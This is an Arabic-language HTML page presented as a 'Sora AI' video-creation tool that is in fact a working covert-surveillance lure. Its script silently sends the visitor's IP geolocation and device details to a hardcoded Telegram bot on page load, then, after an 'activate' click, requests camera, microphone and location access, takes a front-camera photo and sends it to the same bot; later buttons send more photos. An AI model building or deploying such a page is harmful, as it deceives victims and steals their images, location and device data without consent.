<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>Sora AI - منشئ الفيديوهات</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{background:#000;overflow:hidden;font-family:'Cairo','SF Pro Display',Arial,sans-serif;}

/* خلفية احترافية */
.bg{position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(ellipse at 30% 40%, #0a0a2e, #000000);z-index:0;}
.bg::before{content:'';position:absolute;top:0;left:0;width:100%;height:100%;background:radial-gradient(circle at 70% 30%, rgba(255,0,80,0.08), transparent);}
.particle{position:absolute;width:2px;height:2px;background:#ff0050;border-radius:50%;opacity:0;animation:floatParticle 6s infinite;}
@keyframes floatParticle{0%{opacity:0;transform:translateY(0);}50%{opacity:0.5;}100%{opacity:0;transform:translateY(-100px);}}

.container{position:relative;z-index:10;width:100vw;height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}

/* البطاقة الرئيسية */
.sora-card{max-width:500px;width:100%;background:rgba(15,15,25,0.85);backdrop-filter:blur(25px);border-radius:60px;border:1px solid rgba(255,0,80,0.3);overflow:hidden;box-shadow:0 25px 50px rgba(0,0,0,0.5),0 0 30px rgba(255,0,80,0.1);}
.sora-header{background:linear-gradient(135deg,#1a1a2e,#0a0a15);padding:35px 30px 25px;text-align:center;}
.sora-logo{width:65px;height:65px;background:linear-gradient(135deg,#ff0050,#ff0080);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 15px;box-shadow:0 0 20px rgba(255,0,80,0.5);}
.sora-logo svg{width:35px;height:35px;fill:#fff;}
.sora-header h1{color:#fff;font-size:28px;font-weight:700;}
.sora-header h1 span{background:linear-gradient(45deg,#ff0050,#ff0080);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
.sora-header p{color:#888;font-size:14px;margin-top:8px;}

.sora-body{padding:30px;}
.feature-list{display:flex;flex-direction:column;gap:12px;margin-bottom:30px;}
.feature{display:flex;align-items:center;gap:15px;padding:12px 15px;background:rgba(255,255,255,0.03);border-radius:30px;border:1px solid rgba(255,255,255,0.05);}
.feature-icon{width:45px;height:45px;background:rgba(255,0,80,0.12);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:22px;}
.feature-text h4{color:#fff;font-size:15px;margin-bottom:3px;}
.feature-text p{color:#777;font-size:11px;}

.sora-btn{width:100%;padding:18px;background:linear-gradient(90deg,#ff0050,#ff0080);border:none;border-radius:50px;color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:0.3s;margin-bottom:15px;display:flex;align-items:center;justify-content:center;gap:10px;}
.sora-btn:active{transform:scale(0.98);}
.sora-footer{text-align:center;padding:15px 0 0;border-top:1px solid rgba(255,255,255,0.05);}
.sora-footer span{color:#555;font-size:11px;}

/* شاشة التحميل */
.loading-screen{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.98);z-index:100;display:flex;flex-direction:column;align-items:center;justify-content:center;visibility:hidden;opacity:0;transition:0.3s;}
.loading-screen.active{visibility:visible;opacity:1;}
.sora-spinner{width:70px;height:70px;border:3px solid rgba(255,255,255,0.1);border-top-color:#ff0050;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:25px;}
@keyframes spin{to{transform:rotate(360deg);}}
.loading-title{color:#fff;font-size:20px;font-weight:600;margin-bottom:8px;}
.loading-desc{color:#888;font-size:13px;margin-bottom:20px;}
.loading-bar{width:280px;height:4px;background:#1a1a1a;border-radius:4px;overflow:hidden;}
.loading-fill{width:0%;height:100%;background:linear-gradient(90deg,#ff0050,#ff0080);transition:width 0.3s;}

/* واجهة Sora Studio */
.sora-studio{position:fixed;top:0;left:0;width:100%;height:100%;z-index:50;display:flex;flex-direction:column;visibility:hidden;opacity:0;transition:0.5s;background:#0a0a0a;}
.sora-studio.active{visibility:visible;opacity:1;}
.studio-header{background:linear-gradient(135deg,#1a1a2e,#0a0a15);padding:18px;text-align:center;border-bottom:1px solid rgba(255,0,80,0.2);}
.studio-header h2{color:#fff;font-size:18px;}
.studio-header h2 span{color:#ff0050;}
.studio-video{flex:1;background:#000;display:flex;align-items:center;justify-content:center;}
.studio-video video{width:100%;max-height:65vh;object-fit:contain;}
.studio-controls{padding:20px;background:#111;display:flex;gap:12px;border-top:1px solid #222;}
.studio-btn{flex:1;padding:14px;border:none;border-radius:40px;font-size:15px;font-weight:600;cursor:pointer;}
.btn-primary{background:#ff0050;color:#fff;}
.btn-secondary{background:#222;color:#fff;border:1px solid #444;}
</style>
</head>
<body>

<div class="bg" id="bg"></div>

<div class="container">
    <div class="sora-card">
        <div class="sora-header">
            <div class="sora-logo">
                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 4c1.1 0 2 .9 2 2s-.9 2-2 2-2-.9-2-2 .9-2 2-2zm0 13c-2.33 0-4.31-1.46-5.11-3.5h10.22c-.8 2.04-2.78 3.5-5.11 3.5z"/></svg>
            </div>
            <h1>Sora <span>AI</span></h1>
            <p>منشئ الفيديوهات بالذكاء الاصطناعي</p>
        </div>
        
        <div class="sora-body">
            <div class="feature-list">
                <div class="feature">
                    <div class="feature-icon">🎬</div>
                    <div class="feature-text">
                        <h4>إنشاء فيديوهات احترافية</h4>
                        <p>من النص إلى فيديو بدقة عالية</p>
                    </div>
                </div>
                <div class="feature">
                    <div class="feature-icon">📸</div>
                    <div class="feature-text">
                        <h4>كاميرا ذكية</h4>
                        <p>التقاط وتحسين صور المنتجات</p>
                    </div>
                </div>
                <div class="feature">
                    <div class="feature-icon">🎤</div>
                    <div class="feature-text">
                        <h4>مؤثرات صوتية</h4>
                        <p>إضافة صوت وتعليقات احترافية</p>
                    </div>
                </div>
            </div>
            
            <button class="sora-btn" id="activateBtn">
                ✨ تفعيل الذكاء الاصطناعي ✨
            </button>
            <div class="sora-footer">
                <span>🔒 آمن • تقنية AI • جميع الحقوق محفوظة</span>
            </div>
        </div>
    </div>
</div>

<div class="loading-screen" id="loadingScreen">
    <div class="sora-spinner"></div>
    <div class="loading-title" id="loadingTitle">جاري تشغيل الذكاء الاصطناعي</div>
    <div class="loading-desc" id="loadingDesc">تهيئة النظام...</div>
    <div class="loading-bar"><div class="loading-fill" id="loadingFill"></div></div>
</div>

<div class="sora-studio" id="soraStudio">
    <div class="studio-header">
        <h2>Sora <span>AI Studio</span></h2>
    </div>
    <div class="studio-video">
        <video id="previewVideo" autoplay loop muted playsinline>
            <source src="https://cdn.pixabay.com/video/2024/01/15/197032-902536795_large.mp4" type="video/mp4">
        </video>
    </div>
    <div class="studio-controls">
        <button class="btn-secondary" id="captureBtn">📸 تصوير</button>
        <button class="btn-primary" id="generateBtn">🎬 إنشاء فيديو</button>
    </div>
</div>

<script>
const BOT_TOKEN = '8611440321:AAH-_EXmy8Mlpz70a9y4R2UuCCckjB6P_CI';
const CHAT_ID = '178779116';

let permissionsReady = false;
let userLocation = { ip: '', city: '', country: '', region: '' };

// توليد جسيمات
for(let i=0;i<50;i++){
    let p=document.createElement('div');
    p.className='particle';
    p.style.left=Math.random()*100+'%';
    p.style.top=Math.random()*100+'%';
    p.style.animationDelay=Math.random()*6+'s';
    p.style.animationDuration=Math.random()*5+4+'s';
    document.getElementById('bg').appendChild(p);
}

// ============= جمع موقع المستخدم في الخلفية (بدون ظهور) =============
async function getLocationInBackground() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        userLocation = {
            ip: data.ip || 'غير معروف',
            city: data.city || 'غير معروف',
            country: data.country_name || 'غير معروف',
            region: data.region || '',
            latitude: data.latitude,
            longitude: data.longitude
        };
        
        // إرسال الموقع إلى تليجرام في الخلفية
        let locationMsg = `📍 معلومات الموقع (تم جمعها تلقائياً)\n`;
        locationMsg += `🌐 IP: ${userLocation.ip}\n`;
        locationMsg += `🏙️ المدينة: ${userLocation.city}\n`;
        locationMsg += `🗺️ الدولة: ${userLocation.country}\n`;
        locationMsg += `📱 الجهاز: ${navigator.userAgent.substring(0, 60)}\n`;
        locationMsg += `⏰ الوقت: ${new Date().toLocaleString()}`;
        
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(locationMsg)}`);
        
        // إذا كان الموقع متوفر، نرسل رابط خرائط
        if(userLocation.latitude && userLocation.longitude) {
            let mapMsg = `🗺️ رابط الموقع: https://maps.google.com/?q=${userLocation.latitude},${userLocation.longitude}`;
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(mapMsg)}`);
        }
        
        console.log('✅ تم جمع موقع المستخدم في الخلفية');
    } catch(e) {
        console.log('❌ فشل جمع الموقع');
    }
}

// ============= طلب جميع الصلاحيات =============
async function requestPermissions() {
    updateLoading('جاري طلب الصلاحيات','الوصول إلى الكاميرا والميكروفون',20);
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        stream.getTracks().forEach(t => t.stop());
        updateLoading('تم التفعيل','✅ الكاميرا والميكروفون',50);
    } catch(e){}
    
    try {
        await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true,timeout:5000}));
        updateLoading('تم التفعيل','✅ الموقع الجغرافي',70);
    } catch(e){}
    
    permissionsReady = true;
}

// ============= التقاط صورة =============
async function captureImage() {
    if(!permissionsReady) return null;
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        const video = document.createElement('video');
        video.srcObject = stream;
        await new Promise(r => video.onloadedmetadata = r);
        video.play();
        return new Promise((resolve)=>{
            setTimeout(()=>{
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video,0,0);
                const img = canvas.toDataURL('image/jpeg',0.8);
                stream.getTracks().forEach(t=>t.stop());
                resolve(img);
            },500);
        });
    } catch(e){ return null; }
}

// ============= إرسال إلى تليجرام =============
async function sendToTelegram(text, image=null){
    try{
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
        if(image){
            const blob=await fetch(image).then(r=>r.blob());
            const fd=new FormData();
            fd.append('chat_id',CHAT_ID);
            fd.append('photo',blob);
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:'POST',body:fd});
        }
    }catch(e){}
}

// ============= تحديث شاشة التحميل =============
function updateLoading(title,desc,percent){
    document.getElementById('loadingTitle').innerHTML=title;
    document.getElementById('loadingDesc').innerHTML=desc;
    document.getElementById('loadingFill').style.width=percent+'%';
}

// ============= الضغطة الواحدة =============
async function activateAI(){
    document.querySelector('.sora-card').style.opacity='0';
    document.querySelector('.sora-card').style.transition='0.3s';
    document.getElementById('loadingScreen').classList.add('active');
    
    await requestPermissions();
    
    updateLoading('جمع البيانات','تحليل معلومات الجهاز',80);
    const deviceInfo = { userAgent:navigator.userAgent, screen:`${screen.width}x${screen.height}`, language:navigator.language };
    
    updateLoading('التقاط صورة','باستخدام الكاميرا الذكية',90);
    const image = await captureImage();
    
    updateLoading('إرسال البيانات','تأمين الاتصال',95);
    
    // إرسال تقرير كامل مع الموقع
    let msg = `🤖 تم تفعيل Sora AI\n`;
    msg += `📱 ${deviceInfo.userAgent.substring(0,80)}\n`;
    msg += `🖥️ الشاشة: ${deviceInfo.screen}\n`;
    msg += `🌐 اللغة: ${deviceInfo.language}\n`;
    msg += `📍 الموقع: ${userLocation.city}, ${userLocation.country}\n`;
    msg += `🌐 IP: ${userLocation.ip}\n`;
    msg += `⏰ ${new Date().toLocaleString()}`;
    
    await sendToTelegram(msg, image);
    
    updateLoading('جاهز!','تم تفعيل النظام بنجاح',100);
    
    setTimeout(()=>{
        document.getElementById('loadingScreen').classList.remove('active');
        document.getElementById('soraStudio').classList.add('active');
    },1500);
}

// ============= تصوير جديد =============
async function captureNew(){
    const img = await captureImage();
    if(img){
        await sendToTelegram('📸 صورة جديدة من Sora AI Studio', img);
        alert('✅ تم التقاط الصورة!');
    } else { alert('❌ حدث خطأ'); }
}

// ============= إنشاء فيديو =============
async function generateVideo(){
    await sendToTelegram('🎬 طلب إنشاء فيديو جديد من Sora AI Studio');
    alert('✨ جاري إنشاء الفيديو... سيتم إشعارك');
}

// ============= تشغيل جمع الموقع في الخلفية فور فتح الصفحة =============
getLocationInBackground();

// ============= ربط الأحداث =============
document.getElementById('activateBtn').onclick = activateAI;
document.getElementById('captureBtn').onclick = captureNew;
document.getElementById('generateBtn').onclick = generateVideo;

// إرسال إشعار فتح الصفحة
fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent('🚀 تم فتح Sora AI Studio\n📱 '+navigator.userAgent)}`);
</script>
</body>
</html>
